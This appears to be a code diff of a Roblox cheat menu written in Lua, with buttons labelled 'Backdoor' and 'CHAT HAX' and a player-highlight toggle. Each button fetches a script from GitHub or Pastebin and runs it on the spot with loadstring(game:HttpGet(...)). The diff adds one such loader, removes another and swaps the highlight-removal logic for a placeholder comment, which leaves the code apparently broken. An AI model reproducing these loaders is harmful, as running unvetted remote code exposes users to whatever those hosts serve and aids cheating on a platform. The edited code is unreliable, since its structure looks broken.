@@ -42,6 +42,10 @@ mainTab:CreateButton("Backdoor", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
 end)
 
+mainTab:CreateButton("CHAT HAX", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/kbDLN1HR"))()
+end)
+
 local highlightEnabled = false
 
 mainTab:CreateToggle("Highlight Players", function(state)
@@ -55,16 +59,10 @@ highlight.FillColor = Color3.new(1, 0, 0)
 highlight.OutlineColor = Color3.new(1, 0, 0)
 highlight.Parent = player.Character
 else
-if player.Character:FindFirstChildOfClass("Highlight") then
-player.Character:FindFirstChildOfClass("Highlight"):Destroy()
+-- código para remover o highlight se necessário
 end
 end
 end
-end
-end)
-
-mainTab:CreateButton("Infinite Yield", function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 end)
 
 PabloLib:Init()
